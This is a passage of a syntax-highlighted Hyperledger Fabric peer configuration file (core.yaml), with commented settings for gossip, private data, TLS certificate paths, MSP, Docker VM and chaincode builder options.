class="hljs-literal">false</span><br>        <span class="hljs-comment"># Statically defines peer to be an organization &quot;leader&quot;,</span><br>        <span class="hljs-comment"># where this means that current peer will maintain connection</span><br>        <span class="hljs-comment"># with ordering service and disseminate block across peers in</span><br>        <span class="hljs-comment"># its own organization. Multiple peers or all peers in an organization</span><br>        <span class="hljs-comment"># may be configured as org leaders, so that they all pull</span><br>        <span class="hljs-comment"># blocks directly from ordering service.</span><br>        <span class="hljs-attr">orgLeader:</span> <span class="hljs-literal">true</span><br><br>        <span class="hljs-comment"># Interval for membershipTracker polling</span><br>        <span class="hljs-attr">membershipTrackerInterval:</span> <span class="hljs-string">5s</span><br><br>        <span class="hljs-comment"># Overrides the endpoint that the peer publishes to peers</span><br>        <span class="hljs-comment"># in its organization. For peers in foreign organizations</span><br>        <span class="hljs-comment"># see &#x27;externalEndpoint&#x27;</span><br>        <span class="hljs-attr">endpoint:</span><br>        <span class="hljs-comment"># Maximum count of blocks stored in memory</span><br>        <span class="hljs-attr">maxBlockCountToStore:</span> <span class="hljs-number">10</span><br>        <span class="hljs-comment"># Max time between consecutive message pushes(unit: millisecond)</span><br>        <span class="hljs-attr">maxPropagationBurstLatency:</span> <span class="hljs-string">10ms</span><br>        <span class="hljs-comment"># Max number of messages stored until a push is triggered to remote peers</span><br>        <span class="hljs-attr">maxPropagationBurstSize:</span> <span class="hljs-number">10</span><br>        <span class="hljs-comment"># Number of times a message is pushed to remote peers</span><br>        <span class="hljs-attr">propagateIterations:</span> <span class="hljs-number">1</span><br>        <span class="hljs-comment"># Number of peers selected to push messages to</span><br>        <span class="hljs-attr">propagatePeerNum:</span> <span class="hljs-number">3</span><br>        <span class="hljs-comment"># Determines frequency of pull phases(unit: second)</span><br>        <span class="hljs-comment"># Must be greater than digestWaitTime + responseWaitTime</span><br>        <span class="hljs-attr">pullInterval:</span> <span class="hljs-string">4s</span><br>        <span class="hljs-comment"># Number of peers to pull from</span><br>        <span class="hljs-attr">pullPeerNum:</span> <span class="hljs-number">3</span><br>        <span class="hljs-comment"># Determines frequency of pulling state info messages from peers(unit: second)</span><br>        <span class="hljs-attr">requestStateInfoInterval:</span> <span class="hljs-string">4s</span><br>        <span class="hljs-comment"># Determines frequency of pushing state info messages to peers(unit: second)</span><br>        <span class="hljs-attr">publishStateInfoInterval:</span> <span class="hljs-string">4s</span><br>        <span class="hljs-comment"># Maximum time a stateInfo message is kept until expired</span><br>        <span class="hljs-attr">stateInfoRetentionInterval:</span><br>        <span class="hljs-comment"># Time from startup certificates are included in Alive messages(unit: second)</span><br>        <span class="hljs-attr">publishCertPeriod:</span> <span class="hljs-string">10s</span><br>        <span class="hljs-comment"># Should we skip verifying block messages or not (currently not in use)</span><br>        <span class="hljs-attr">skipBlockVerification:</span> <span class="hljs-literal">false</span><br>        <span class="hljs-comment"># Dial timeout(unit: second)</span><br>        <span class="hljs-attr">dialTimeout:</span> <span class="hljs-string">3s</span><br>        <span class="hljs-comment"># Connection timeout(unit: second)</span><br>        <span class="hljs-attr">connTimeout:</span> <span class="hljs-string">2s</span><br>        <span class="hljs-comment"># Buffer size of received messages</span><br>        <span class="hljs-attr">recvBuffSize:</span> <span class="hljs-number">20</span><br>        <span class="hljs-comment"># Buffer size of sending messages</span><br>        <span class="hljs-attr">sendBuffSize:</span> <span class="hljs-number">200</span><br>        <span class="hljs-comment"># Time to wait before pull engine processes incoming digests (unit: second)</span><br>        <span class="hljs-comment"># Should be slightly smaller than requestWaitTime</span><br>        <span class="hljs-attr">digestWaitTime:</span> <span class="hljs-string">1s</span><br>        <span class="hljs-comment"># Time to wait before pull engine removes incoming nonce (unit: milliseconds)</span><br>        <span class="hljs-comment"># Should be slightly bigger than digestWaitTime</span><br>        <span class="hljs-attr">requestWaitTime:</span> <span class="hljs-string">1500ms</span><br>        <span class="hljs-comment"># Time to wait before pull engine ends pull (unit: second)</span><br>        <span class="hljs-attr">responseWaitTime:</span> <span class="hljs-string">2s</span><br>        <span class="hljs-comment"># Alive check interval(unit: second)</span><br>        <span class="hljs-attr">aliveTimeInterval:</span> <span class="hljs-string">5s</span><br>        <span class="hljs-comment"># Alive expiration timeout(unit: second)</span><br>        <span class="hljs-attr">aliveExpirationTimeout:</span> <span class="hljs-string">25s</span><br>        <span class="hljs-comment"># Reconnect interval(unit: second)</span><br>        <span class="hljs-attr">reconnectInterval:</span> <span class="hljs-string">25s</span><br>        <span class="hljs-comment"># Max number of attempts to connect to a peer</span><br>        <span class="hljs-attr">maxConnectionAttempts:</span> <span class="hljs-number">120</span><br>        <span class="hljs-comment"># Message expiration factor for alive messages</span><br>        <span class="hljs-attr">msgExpirationFactor:</span> <span class="hljs-number">20</span><br>        <span class="hljs-comment"># This is an endpoint that is published to peers outside of the organization.</span><br>        <span class="hljs-comment"># If this isn&#x27;t set, the peer will not be known to other organizations.</span><br>        <span class="hljs-attr">externalEndpoint:</span><br>        <span class="hljs-comment"># Leader election service configuration</span><br>        <span class="hljs-attr">election:</span><br>            <span class="hljs-comment"># Longest time peer waits for stable membership during leader election startup (unit: second)</span><br>            <span class="hljs-attr">startupGracePeriod:</span> <span class="hljs-string">15s</span><br>            <span class="hljs-comment"># Interval gossip membership samples to check its stability (unit: second)</span><br>            <span class="hljs-attr">membershipSampleInterval:</span> <span class="hljs-string">1s</span><br>            <span class="hljs-comment"># Time passes since last declaration message before peer decides to perform leader election (unit: second)</span><br>            <span class="hljs-attr">leaderAliveThreshold:</span> <span class="hljs-string">10s</span><br>            <span class="hljs-comment"># Time between peer sends propose message and declares itself as a leader (sends declaration message) (unit: second)</span><br>            <span class="hljs-attr">leaderElectionDuration:</span> <span class="hljs-string">5s</span><br><br>        <span class="hljs-attr">pvtData:</span><br>            <span class="hljs-comment"># pullRetryThreshold determines the maximum duration of time private data corresponding for a given block</span><br>            <span class="hljs-comment"># would be attempted to be pulled from peers until the block would be committed without the private data</span><br>            <span class="hljs-attr">pullRetryThreshold:</span> <span class="hljs-string">60s</span><br>            <span class="hljs-comment"># As private data enters the transient store, it is associated with the peer&#x27;s ledger&#x27;s height at that time.</span><br>            <span class="hljs-comment"># transientstoreMaxBlockRetention defines the maximum difference between the current ledger&#x27;s height upon commit,</span><br>            <span class="hljs-comment"># and the private data residing inside the transient store that is guaranteed not to be purged.</span><br>            <span class="hljs-comment"># Private data is purged from the transient store when blocks with sequences that are multiples</span><br>            <span class="hljs-comment"># of transientstoreMaxBlockRetention are committed.</span><br>            <span class="hljs-attr">transientstoreMaxBlockRetention:</span> <span class="hljs-number">1000</span><br>            <span class="hljs-comment"># pushAckTimeout is the maximum time to wait for an acknowledgement from each peer</span><br>            <span class="hljs-comment"># at private data push at endorsement time.</span><br>            <span class="hljs-attr">pushAckTimeout:</span> <span class="hljs-string">3s</span><br>            <span class="hljs-comment"># Block to live pulling margin, used as a buffer</span><br>            <span class="hljs-comment"># to prevent peer from trying to pull private data</span><br>            <span class="hljs-comment"># from peers that is soon to be purged in next N blocks.</span><br>            <span class="hljs-comment"># This helps a newly joined peer catch up to current</span><br>            <span class="hljs-comment"># blockchain height quicker.</span><br>            <span class="hljs-attr">btlPullMargin:</span> <span class="hljs-number">10</span><br>            <span class="hljs-comment"># the process of reconciliation is done in an endless loop, while in each iteration reconciler tries to</span><br>            <span class="hljs-comment"># pull from the other peers the most recent missing blocks with a maximum batch size limitation.</span><br>            <span class="hljs-comment"># reconcileBatchSize determines the maximum batch size of missing private data that will be reconciled in a</span><br>            <span class="hljs-comment"># single iteration.</span><br>            <span class="hljs-attr">reconcileBatchSize:</span> <span class="hljs-number">10</span><br>            <span class="hljs-comment"># reconcileSleepInterval determines the time reconciler sleeps from end of an iteration until the beginning</span><br>            <span class="hljs-comment"># of the next reconciliation iteration.</span><br>            <span class="hljs-attr">reconcileSleepInterval:</span> <span class="hljs-string">1m</span><br>            <span class="hljs-comment"># reconciliationEnabled is a flag that indicates whether private data reconciliation is enable or not.</span><br>            <span class="hljs-attr">reconciliationEnabled:</span> <span class="hljs-literal">true</span><br>            <span class="hljs-comment"># skipPullingInvalidTransactionsDuringCommit is a flag that indicates whether pulling of invalid</span><br>            <span class="hljs-comment"># transaction&#x27;s private data from other peers need to be skipped during the commit time and pulled</span><br>            <span class="hljs-comment"># only through reconciler.</span><br>            <span class="hljs-attr">skipPullingInvalidTransactionsDuringCommit:</span> <span class="hljs-literal">false</span><br>            <span class="hljs-comment"># implicitCollectionDisseminationPolicy specifies the dissemination  policy for the peer&#x27;s own implicit collection.</span><br>            <span class="hljs-comment"># When a peer endorses a proposal that writes to its own implicit collection, below values override the default values</span><br>            <span class="hljs-comment"># for disseminating private data.</span><br>            <span class="hljs-comment"># Note that it is applicable to all channels the peer has joined. The implication is that requiredPeerCount has to</span><br>            <span class="hljs-comment"># be smaller than the number of peers in a channel that has the lowest numbers of peers from the organization.</span><br>            <span class="hljs-attr">implicitCollectionDisseminationPolicy:</span><br>               <span class="hljs-comment"># requiredPeerCount defines the minimum number of eligible peers to which the peer must successfully</span><br>               <span class="hljs-comment"># disseminate private data for its own implicit collection during endorsement. Default value is 0.</span><br>               <span class="hljs-attr">requiredPeerCount:</span> <span class="hljs-number">0</span><br>               <span class="hljs-comment"># maxPeerCount defines the maximum number of eligible peers to which the peer will attempt to</span><br>               <span class="hljs-comment"># disseminate private data for its own implicit collection during endorsement. Default value is 1.</span><br>               <span class="hljs-attr">maxPeerCount:</span> <span class="hljs-number">1</span><br><br>        <span class="hljs-comment"># Gossip state transfer related configuration</span><br>        <span class="hljs-attr">state:</span><br>            <span class="hljs-comment"># indicates whenever state transfer is enabled or not</span><br>            <span class="hljs-comment"># default value is false, i.e. state transfer is active</span><br>            <span class="hljs-comment"># and takes care to sync up missing blocks allowing</span><br>            <span class="hljs-comment"># lagging peer to catch up to speed with rest network.</span><br>            <span class="hljs-comment"># Keep in mind that when peer.gossip.useLeaderElection is true</span><br>            <span class="hljs-comment"># and there are several peers in the organization,</span><br>            <span class="hljs-comment"># or peer.gossip.useLeaderElection is false alongside with</span><br>            <span class="hljs-comment"># peer.gossip.orgleader being false, the peer&#x27;s ledger may lag behind</span><br>            <span class="hljs-comment"># the rest of the peers and will never catch up due to state transfer</span><br>            <span class="hljs-comment"># being disabled.</span><br>            <span class="hljs-attr">enabled:</span> <span class="hljs-literal">false</span><br>            <span class="hljs-comment"># checkInterval interval to check whether peer is lagging behind enough to</span><br>            <span class="hljs-comment"># request blocks via state transfer from another peer.</span><br>            <span class="hljs-attr">checkInterval:</span> <span class="hljs-string">10s</span><br>            <span class="hljs-comment"># responseTimeout amount of time to wait for state transfer response from</span><br>            <span class="hljs-comment"># other peers</span><br>            <span class="hljs-attr">responseTimeout:</span> <span class="hljs-string">3s</span><br>            <span class="hljs-comment"># batchSize the number of blocks to request via state transfer from another peer</span><br>            <span class="hljs-attr">batchSize:</span> <span class="hljs-number">10</span><br>            <span class="hljs-comment"># blockBufferSize reflects the size of the re-ordering buffer</span><br>            <span class="hljs-comment"># which captures blocks and takes care to deliver them in order</span><br>            <span class="hljs-comment"># down to the ledger layer. The actual buffer size is bounded between</span><br>            <span class="hljs-comment"># 0 and 2*blockBufferSize, each channel maintains its own buffer</span><br>            <span class="hljs-attr">blockBufferSize:</span> <span class="hljs-number">20</span><br>            <span class="hljs-comment"># maxRetries maximum number of re-tries to ask</span><br>            <span class="hljs-comment"># for single state transfer request</span><br>            <span class="hljs-attr">maxRetries:</span> <span class="hljs-number">3</span><br><br>    <span class="hljs-comment"># TLS Settings</span><br>    <span class="hljs-attr">tls:</span><br>        <span class="hljs-comment"># Require server-side TLS</span><br>        <span class="hljs-attr">enabled:</span>  <span class="hljs-literal">true</span><br>        <span class="hljs-comment"># Require client certificates / mutual TLS for inbound connections.</span><br>        <span class="hljs-comment"># Note that clients that are not configured to use a certificate will</span><br>        <span class="hljs-comment"># fail to connect to the peer.</span><br>        <span class="hljs-attr">clientAuthRequired:</span> <span class="hljs-literal">false</span><br>        <span class="hljs-comment"># X.509 certificate used for TLS server</span><br>        <span class="hljs-attr">cert:</span><br>            <span class="hljs-attr">file:</span> <span class="hljs-string">/home/moindy/project/fabric/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.crt</span><br>        <span class="hljs-comment"># Private key used for TLS server</span><br>        <span class="hljs-attr">key:</span><br>            <span class="hljs-attr">file:</span> <span class="hljs-string">/home/moindy/project/fabric/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.key</span><br>        <span class="hljs-comment"># rootcert.file represents the trusted root certificate chain used for verifying certificates</span><br>        <span class="hljs-comment"># of other nodes during outbound connections.</span><br>        <span class="hljs-comment"># It is not required to be set, but can be used to augment the set of TLS CA certificates</span><br>        <span class="hljs-comment"># available from the MSPs of each channel’s configuration.</span><br>        <span class="hljs-attr">rootcert:</span><br>            <span class="hljs-attr">file:</span> <span class="hljs-string">/home/moindy/project/fabric/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt</span><br>        <span class="hljs-comment"># If mutual TLS is enabled, clientRootCAs.files contains a list of additional root certificates</span><br>        <span class="hljs-comment"># used for verifying certificates of client connections.</span><br>        <span class="hljs-comment"># It augments the set of TLS CA certificates available from the MSPs of each channel’s configuration.</span><br>        <span class="hljs-comment"># Minimally, set your organization&#x27;s TLS CA root certificate so that the peer can receive join channel requests.</span><br>        <span class="hljs-attr">clientRootCAs:</span><br>            <span class="hljs-attr">files:</span><br>              <span class="hljs-bullet">-</span> <span class="hljs-string">/home/moindy/project/fabric/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt</span><br>        <span class="hljs-comment"># Private key used for TLS when making client connections.</span><br>        <span class="hljs-comment"># If not set, peer.tls.key.file will be used instead</span><br>        <span class="hljs-attr">clientKey:</span><br>            <span class="hljs-attr">file:</span><br>        <span class="hljs-comment"># X.509 certificate used for TLS when making client connections.</span><br>        <span class="hljs-comment"># If not set, peer.tls.cert.file will be used instead</span><br>        <span class="hljs-attr">clientCert:</span><br>            <span class="hljs-attr">file:</span><br><br>    <span class="hljs-comment"># Authentication contains configuration parameters related to authenticating</span><br>    <span class="hljs-comment"># client messages</span><br>    <span class="hljs-attr">authentication:</span><br>        <span class="hljs-comment"># the acceptable difference between the current server time and the</span><br>        <span class="hljs-comment"># client&#x27;s time as specified in a client request message</span><br>        <span class="hljs-attr">timewindow:</span> <span class="hljs-string">15m</span><br><br>    <span class="hljs-comment"># Path on the file system where peer will store data (eg ledger). This</span><br>    <span class="hljs-comment"># location must be access control protected to prevent unintended</span><br>    <span class="hljs-comment"># modification that might corrupt the peer operations.</span><br>    <span class="hljs-comment">#peer节点存储数据文件的地方</span><br>    <span class="hljs-attr">fileSystemPath:</span> <span class="hljs-string">/var/hyperledger/production/org1-peer0</span><br><br>    <span class="hljs-comment"># BCCSP (Blockchain crypto provider): Select which crypto implementation or</span><br>    <span class="hljs-comment"># library to use</span><br>    <span class="hljs-attr">BCCSP:</span><br>        <span class="hljs-attr">Default:</span> <span class="hljs-string">SW</span><br>        <span class="hljs-comment"># Settings for the SW crypto provider (i.e. when DEFAULT: SW)</span><br>        <span class="hljs-attr">SW:</span><br>            <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> The default Hash and Security level needs refactoring to be</span><br>            <span class="hljs-comment"># fully configurable. Changing these defaults requires coordination</span><br>            <span class="hljs-comment"># SHA2 is hardcoded in several places, not only BCCSP</span><br>            <span class="hljs-attr">Hash:</span> <span class="hljs-string">SHA2</span><br>            <span class="hljs-attr">Security:</span> <span class="hljs-number">256</span><br>            <span class="hljs-comment"># Location of Key Store</span><br>            <span class="hljs-attr">FileKeyStore:</span><br>                <span class="hljs-comment"># If &quot;&quot;, defaults to &#x27;mspConfigPath&#x27;/keystore</span><br>                <span class="hljs-attr">KeyStore:</span><br>        <span class="hljs-comment"># Settings for the PKCS#11 crypto provider (i.e. when DEFAULT: PKCS11)</span><br>        <span class="hljs-attr">PKCS11:</span><br>            <span class="hljs-comment"># Location of the PKCS11 module library</span><br>            <span class="hljs-attr">Library:</span><br>            <span class="hljs-comment"># Token Label</span><br>            <span class="hljs-attr">Label:</span><br>            <span class="hljs-comment"># User PIN</span><br>            <span class="hljs-attr">Pin:</span><br>            <span class="hljs-attr">Hash:</span><br>            <span class="hljs-attr">Security:</span><br><br>    <span class="hljs-comment"># Path on the file system where peer will find MSP local configurations</span><br>    <span class="hljs-attr">mspConfigPath:</span> <span class="hljs-string">/home/moindy/project/fabric/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/msp</span><br><br>    <span class="hljs-comment"># Identifier of the local MSP</span><br>    <span class="hljs-comment"># ----!!!!IMPORTANT!!!-!!!IMPORTANT!!!-!!!IMPORTANT!!!!----</span><br>    <span class="hljs-comment"># Deployers need to change the value of the localMspId string.</span><br>    <span class="hljs-comment"># In particular, the name of the local MSP ID of a peer needs</span><br>    <span class="hljs-comment"># to match the name of one of the MSPs in each of the channel</span><br>    <span class="hljs-comment"># that this peer is a member of. Otherwise this peer&#x27;s messages</span><br>    <span class="hljs-comment"># will not be identified as valid by other nodes.</span><br>    <span class="hljs-attr">localMspId:</span> <span class="hljs-string">Org1MSP</span><br><br>    <span class="hljs-comment"># CLI common client config options</span><br>    <span class="hljs-attr">client:</span><br>        <span class="hljs-comment"># connection timeout</span><br>        <span class="hljs-attr">connTimeout:</span> <span class="hljs-string">3s</span><br><br>    <span class="hljs-comment"># Delivery service related config</span><br>    <span class="hljs-attr">deliveryclient:</span><br>        <span class="hljs-comment"># Enables this peer to disseminate blocks it pulled from the ordering service</span><br>        <span class="hljs-comment"># via gossip.</span><br>        <span class="hljs-comment"># Note that &#x27;gossip.state.enabled&#x27; controls point to point block replication</span><br>        <span class="hljs-comment"># of blocks committed in the past.</span><br>        <span class="hljs-attr">blockGossipEnabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-comment"># It sets the total time the delivery service may spend in reconnection</span><br>        <span class="hljs-comment"># attempts until its retry logic gives up and returns an error</span><br>        <span class="hljs-attr">reconnectTotalTimeThreshold:</span> <span class="hljs-string">3600s</span><br><br>        <span class="hljs-comment"># It sets the delivery service &lt;-&gt; ordering service node connection timeout</span><br>        <span class="hljs-attr">connTimeout:</span> <span class="hljs-string">3s</span><br><br>        <span class="hljs-comment"># It sets the delivery service maximal delay between consecutive retries</span><br>        <span class="hljs-attr">reConnectBackoffThreshold:</span> <span class="hljs-string">3600s</span><br><br>        <span class="hljs-comment"># A list of orderer endpoint addresses which should be overridden</span><br>        <span class="hljs-comment"># when found in channel configurations.</span><br>        <span class="hljs-attr">addressOverrides:</span><br>        <span class="hljs-comment">#  - from:</span><br>        <span class="hljs-comment">#    to:</span><br>        <span class="hljs-comment">#    caCertsFile:</span><br>        <span class="hljs-comment">#  - from:</span><br>        <span class="hljs-comment">#    to:</span><br>        <span class="hljs-comment">#    caCertsFile:</span><br><br>    <span class="hljs-comment"># Type for the local MSP - by default it&#x27;s of type bccsp</span><br>    <span class="hljs-attr">localMspType:</span> <span class="hljs-string">bccsp</span><br><br>    <span class="hljs-comment"># Used with Go profiling tools only in none production environment. In</span><br>    <span class="hljs-comment"># production, it should be disabled (eg enabled: false)</span><br>    <span class="hljs-attr">profile:</span><br>        <span class="hljs-attr">enabled:</span>     <span class="hljs-literal">false</span><br>        <span class="hljs-attr">listenAddress:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:6060</span><br><br>    <span class="hljs-comment"># Handlers defines custom handlers that can filter and mutate</span><br>    <span class="hljs-comment"># objects passing within the peer, such as:</span><br>    <span class="hljs-comment">#   Auth filter - reject or forward proposals from clients</span><br>    <span class="hljs-comment">#   Decorators  - append or mutate the chaincode input passed to the chaincode</span><br>    <span class="hljs-comment">#   Endorsers   - Custom signing over proposal response payload and its mutation</span><br>    <span class="hljs-comment"># Valid handler definition contains:</span><br>    <span class="hljs-comment">#   - A name which is a factory method name defined in</span><br>    <span class="hljs-comment">#     core/handlers/library/library.go for statically compiled handlers</span><br>    <span class="hljs-comment">#   - library path to shared object binary for pluggable filters</span><br>    <span class="hljs-comment"># Auth filters and decorators are chained and executed in the order that</span><br>    <span class="hljs-comment"># they are defined. For example:</span><br>    <span class="hljs-comment"># authFilters:</span><br>    <span class="hljs-comment">#   -</span><br>    <span class="hljs-comment">#     name: FilterOne</span><br>    <span class="hljs-comment">#     library: /opt/lib/filter.so</span><br>    <span class="hljs-comment">#   -</span><br>    <span class="hljs-comment">#     name: FilterTwo</span><br>    <span class="hljs-comment"># decorators:</span><br>    <span class="hljs-comment">#   -</span><br>    <span class="hljs-comment">#     name: DecoratorOne</span><br>    <span class="hljs-comment">#   -</span><br>    <span class="hljs-comment">#     name: DecoratorTwo</span><br>    <span class="hljs-comment">#     library: /opt/lib/decorator.so</span><br>    <span class="hljs-comment"># Endorsers are configured as a map that its keys are the endorsement system chaincodes that are being overridden.</span><br>    <span class="hljs-comment"># Below is an example that overrides the default ESCC and uses an endorsement plugin that has the same functionality</span><br>    <span class="hljs-comment"># as the default ESCC.</span><br>    <span class="hljs-comment"># If the &#x27;library&#x27; property is missing, the name is used as the constructor method in the builtin library similar</span><br>    <span class="hljs-comment"># to auth filters and decorators.</span><br>    <span class="hljs-comment"># endorsers:</span><br>    <span class="hljs-comment">#   escc:</span><br>    <span class="hljs-comment">#     name: DefaultESCC</span><br>    <span class="hljs-comment">#     library: /etc/hyperledger/fabric/plugin/escc.so</span><br>    <span class="hljs-attr">handlers:</span><br>        <span class="hljs-attr">authFilters:</span><br>          <span class="hljs-bullet">-</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">DefaultAuth</span><br>          <span class="hljs-bullet">-</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">ExpirationCheck</span>    <span class="hljs-comment"># This filter checks identity x509 certificate expiration</span><br>        <span class="hljs-attr">decorators:</span><br>          <span class="hljs-bullet">-</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">DefaultDecorator</span><br>        <span class="hljs-attr">endorsers:</span><br>          <span class="hljs-attr">escc:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">DefaultEndorsement</span><br>            <span class="hljs-attr">library:</span><br>        <span class="hljs-attr">validators:</span><br>          <span class="hljs-attr">vscc:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">DefaultValidation</span><br>            <span class="hljs-attr">library:</span><br><br>    <span class="hljs-comment">#    library: /etc/hyperledger/fabric/plugin/escc.so</span><br>    <span class="hljs-comment"># Number of goroutines that will execute transaction validation in parallel.</span><br>    <span class="hljs-comment"># By default, the peer chooses the number of CPUs on the machine. Set this</span><br>    <span class="hljs-comment"># variable to override that choice.</span><br>    <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> overriding this value might negatively influence the performance of</span><br>    <span class="hljs-comment"># the peer so please change this value only if you know what you&#x27;re doing</span><br>    <span class="hljs-attr">validatorPoolSize:</span><br><br>    <span class="hljs-comment"># The discovery service is used by clients to query information about peers,</span><br>    <span class="hljs-comment"># such as - which peers have joined a certain channel, what is the latest</span><br>    <span class="hljs-comment"># channel config, and most importantly - given a chaincode and a channel,</span><br>    <span class="hljs-comment"># what possible sets of peers satisfy the endorsement policy.</span><br>    <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-comment"># Whether the authentication cache is enabled or not.</span><br>        <span class="hljs-attr">authCacheEnabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-comment"># The maximum size of the cache, after which a purge takes place</span><br>        <span class="hljs-attr">authCacheMaxSize:</span> <span class="hljs-number">1000</span><br>        <span class="hljs-comment"># The proportion (0 to 1) of entries that remain in the cache after the cache is purged due to overpopulation</span><br>        <span class="hljs-attr">authCachePurgeRetentionRatio:</span> <span class="hljs-number">0.75</span><br>        <span class="hljs-comment"># Whether to allow non-admins to perform non channel scoped queries.</span><br>        <span class="hljs-comment"># When this is false, it means that only peer admins can perform non channel scoped queries.</span><br>        <span class="hljs-attr">orgMembersAllowedAccess:</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-comment"># Limits is used to configure some internal resource limits.</span><br>    <span class="hljs-attr">limits:</span><br>        <span class="hljs-comment"># Concurrency limits the number of concurrently running requests to a service on each peer.</span><br>        <span class="hljs-comment"># Currently this option is only applied to endorser service and deliver service.</span><br>        <span class="hljs-comment"># When the property is missing or the value is 0, the concurrency limit is disabled for the service.</span><br>        <span class="hljs-attr">concurrency:</span><br>            <span class="hljs-comment"># endorserService limits concurrent requests to endorser service that handles chaincode deployment, query and invocation,</span><br>            <span class="hljs-comment"># including both user chaincodes and system chaincodes.</span><br>            <span class="hljs-attr">endorserService:</span> <span class="hljs-number">2500</span><br>            <span class="hljs-comment"># deliverService limits concurrent event listeners registered to deliver service for blocks and transaction events.</span><br>            <span class="hljs-attr">deliverService:</span> <span class="hljs-number">2500</span><br>            <span class="hljs-comment"># gatewayService limits concurrent requests to gateway service that handles the submission and evaluation of transactions.</span><br>            <span class="hljs-attr">gatewayService:</span> <span class="hljs-number">500</span><br><br>    <span class="hljs-comment"># Since all nodes should be consistent it is recommended to keep</span><br>    <span class="hljs-comment"># the default value of 100MB for MaxRecvMsgSize &amp; MaxSendMsgSize</span><br>    <span class="hljs-comment"># Max message size in bytes GRPC server and client can receive</span><br>    <span class="hljs-attr">maxRecvMsgSize:</span> <span class="hljs-number">104857600</span><br>    <span class="hljs-comment"># Max message size in bytes GRPC server and client can send</span><br>    <span class="hljs-attr">maxSendMsgSize:</span> <span class="hljs-number">104857600</span><br><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    VM section</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-attr">vm:</span><br><br>    <span class="hljs-comment"># Endpoint of the vm management system.  For docker can be one of the following in general</span><br>    <span class="hljs-comment"># unix:///var/run/docker.sock</span><br>    <span class="hljs-comment"># http://localhost:2375</span><br>    <span class="hljs-comment"># https://localhost:2376</span><br>    <span class="hljs-comment"># If you utilize external chaincode builders and don&#x27;t need the default Docker chaincode builder,</span><br>    <span class="hljs-comment"># the endpoint should be unconfigured so that the peer&#x27;s Docker health checker doesn&#x27;t get registered.</span><br>    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">unix:///var/run/docker.sock</span><br><br>    <span class="hljs-comment"># settings for docker vms</span><br>    <span class="hljs-attr">docker:</span><br>        <span class="hljs-attr">tls:</span><br>            <span class="hljs-attr">enabled:</span> <span class="hljs-literal">false</span><br>            <span class="hljs-attr">ca:</span><br>                <span class="hljs-attr">file:</span> <span class="hljs-string">docker/ca.crt</span><br>            <span class="hljs-attr">cert:</span><br>                <span class="hljs-attr">file:</span> <span class="hljs-string">docker/tls.crt</span><br>            <span class="hljs-attr">key:</span><br>                <span class="hljs-attr">file:</span> <span class="hljs-string">docker/tls.key</span><br><br>        <span class="hljs-comment"># Enables/disables the standard out/err from chaincode containers for</span><br>        <span class="hljs-comment"># debugging purposes</span><br>        <span class="hljs-attr">attachStdout:</span> <span class="hljs-literal">false</span><br><br>        <span class="hljs-comment"># Parameters on creating docker container.</span><br>        <span class="hljs-comment"># Container may be efficiently created using ipam &amp; dns-server for cluster</span><br>        <span class="hljs-comment"># NetworkMode - sets the networking mode for the container. Supported</span><br>        <span class="hljs-comment"># standard values are: `host`(default),`bridge`,`ipvlan`,`none`.</span><br>        <span class="hljs-comment"># Dns - a list of DNS servers for the container to use.</span><br>        <span class="hljs-comment"># <span class="hljs-doctag">Note:</span>  `Privileged` `Binds` `Links` and `PortBindings` properties of</span><br>        <span class="hljs-comment"># Docker Host Config are not supported and will not be used if set.</span><br>        <span class="hljs-comment"># LogConfig - sets the logging driver (Type) and related options</span><br>        <span class="hljs-comment"># (Config) for Docker. For more info,</span><br>        <span class="hljs-comment"># https://docs.docker.com/engine/admin/logging/overview/</span><br>        <span class="hljs-comment"># <span class="hljs-doctag">Note:</span> Set LogConfig using Environment Variables is not supported.</span><br>        <span class="hljs-attr">hostConfig:</span><br>            <span class="hljs-attr">NetworkMode:</span> <span class="hljs-string">host</span><br>            <span class="hljs-attr">Dns:</span><br>               <span class="hljs-comment"># - 192.168.0.1</span><br>            <span class="hljs-attr">LogConfig:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">json-file</span><br>                <span class="hljs-attr">Config:</span><br>                    <span class="hljs-attr">max-size:</span> <span class="hljs-string">&quot;50m&quot;</span><br>                    <span class="hljs-attr">max-file:</span> <span class="hljs-string">&quot;5&quot;</span><br>            <span class="hljs-attr">Memory:</span> <span class="hljs-number">2147483648</span><br><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    Chaincode section</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-attr">chaincode:</span><br><br>    <span class="hljs-comment"># The id is used by the Chaincode stub to register the executing Chaincode</span><br>    <span class="hljs-comment"># ID with the Peer and is generally supplied through ENV variables</span><br>    <span class="hljs-comment"># the `path` form of ID is provided when installing the chaincode.</span><br>    <span class="hljs-comment"># The `name` is used for all other requests and can be any string.</span><br>    <span class="hljs-attr">id:</span><br>        <span class="hljs-attr">path:</span><br>        <span class="hljs-attr">name:</span><br><br>    <span class="hljs-comment"># Generic builder environment, suitable for most chaincode types</span><br>    <span class="hljs-attr">builder:</span> <span class="hljs-string">$(DOCKER_NS)/fabric-ccenv:$(TWO_DIGIT_VERSION)</span><br><br>    <span class="hljs-comment"># Enables/disables force pulling of the base docker images (listed below)</span><br>    <span 